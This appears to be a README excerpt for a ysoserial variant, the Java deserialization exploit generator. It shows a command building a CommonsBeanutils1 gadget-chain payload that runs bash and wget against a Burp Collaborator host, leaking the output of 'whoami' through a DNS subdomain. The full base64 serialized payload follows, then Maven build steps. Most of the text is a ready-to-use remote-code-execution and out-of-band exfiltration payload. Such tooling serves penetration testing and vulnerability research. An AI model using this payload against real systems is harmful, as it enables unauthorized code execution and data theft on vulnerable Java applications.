
## Examples Usage - Here it is different

```shell
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "java.lang.Runtime.getRuntime().exec(new String []{\"/bin/bash\",\"-c\",\"exec wget http://$(echo '$(whoami)').3fje44rcgof3s85u7g5majjoifofc4.burpcollaborator.net\"}).waitFor();"|base64 
```
```
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAB1XK/rq+AAAAMwBFCgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAEMBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAQamF2YS9sYW5nL1N0cmluZwcAMAEACS9iaW4vYmFzaAgAMgEAAi1jCAA0AQBOZXhlYyB3Z2V0IGh0dHA6Ly8kKHdob2FtaSkuM2ZqZTQ0cmNnb2Yzczg1dTdnNW1hampvaWZvZmM0LmJ1cnBjb2xsYWJvcmF0b3IubmV0CAA2AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADgAOQoAKwA6AQARamF2YS9sYW5nL1Byb2Nlc3MHADwBAAd3YWl0Rm9yAQADKClJDAA+AD8KAD0AQAEADVN0YWNrTWFwVGFibGUBAB15c29zZXJpYWwvUHduZXIyMTcxNzUxNzc3NzU0MAEAH0x5c29zZXJpYWwvUHduZXIyMTcxNzUxNzc3NzU0MDsAIQAHAAIAAQAJAAEAGgALAAwAAQANAAAAAgAOAAQAAQAFAAYAAQAQAAAALwABAAEAAAAFKrcAAbEAAAACABEAAAAGAAEAAAAvABIAAAAMAAEAAAAFABMARAAAAAEAFQAWAAIAEAAAAD8AAAADAAAAAbEAAAACABEAAAAGAAEAAAA0ABIAAAAgAAMAAAABABMARAAAAAAAAQAXABgAAQAAAAEAGQAaAAIAGwAAAAQAAQAcAAEAFQAeAAIAEAAAAEkAAAAEAAAAAbEAAAACABEAAAAGAAEAAAA4ABIAAAAqAAQAAAABABMARAAAAAAAAQAXABgAAQAAAAEAHwAgAAIAAAABACEAIgADABsAAAAEAAEAHAAIACkABgABABAAAAA4AAYAAgAAACOnAAMBTLgALwa9ADFZAxIzU1kEEjVTWQUSN1O2ADu2AEFXsQAAAAEAQgAAAAMAAQMAAgAjAAAAAgAkACUAAAAKAAEABwAmACgACXVxAH4AEAAAAdTK/rq+AAAAMwAbCgACAAMHAAQMAAUABgEAEGphdmEvbGFuZy9PYmplY3QBAAY8aW5pdD4BAAMoKVYHAAgBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwcACgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAGQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAANGb28AIQAHAAIAAQAJAAEAGgALAAwAAQANAAAAAgAOAAEAAQAFAAYAAQAQAAAALwABAAEAAAAFKrcAAbEAAAACABEAAAAGAAEAAAA8ABIAAAAMAAEAAAAFABMAFAAAAAIAFQAAAAIAFgAXAAAACgABAAcAGAAaAAlwdAAEUHducnB3AQB4cQB+AA14
```

## Building

Requires Java 1.7+ and Maven 3.x+

```mvn clean package -DskipTests```
